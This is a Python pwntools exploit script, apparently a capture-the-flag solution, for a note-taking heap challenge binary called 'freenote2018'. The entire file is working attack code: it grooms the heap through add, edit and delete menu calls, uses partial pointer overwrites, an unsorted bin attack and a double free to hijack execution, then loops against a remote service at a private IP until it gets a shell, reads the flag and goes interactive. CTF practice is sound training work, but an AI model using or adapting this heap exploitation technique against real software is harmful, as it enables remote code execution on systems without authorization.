#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import os
code = ELF('./freenote2018')
context.arch = code.arch
context.log_level = 'debug'
gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))

def add(size, content):
    r.sendlineafter('Choice:', '1')
    r.sendlineafter(':', str(size))
    r.sendafter(':', flat(content))

def edit(idx, content):
    r.sendlineafter('Choice:', '2')
    r.sendlineafter(':', str(idx))
    r.sendafter(':', flat(content))

def delete(idx):
    r.sendlineafter('Choice:', '3')
    r.sendlineafter(':', str(idx))

def exploit(r):
    add(0x100, '000')  # 0
    add(0x100, '111')  # 1
    delete(0)
    add(0x20, '222') 
    add(0x60, '333')
    add(0x60, '444')
    add(0x60, '555')
    delete(4)
    delete(5)
    edit(5, '\x30')
    edit(3, '\xfd\x1a')
    add(0x60, '666')
    add(0x60, '777')
    add(0x60, '888')
    delete(1)
    edit(1, [0, '\x00'])
    add(0x100, '999') # unsorted bin attack
    edit(8, 'AAA' + p64(0xafd2a4)[:3])
    delete(0)
    delete(0)
    r.clean()
    r.sendline('cat flag')
    print r.clean()

if __name__ == '__main__':
    while True:
#        r = code.process()
        r = remote('192.168.201.16', 13348)
        try:
            exploit(r)
        except EOFError:
            r.close()
        else:
            r.interactive()
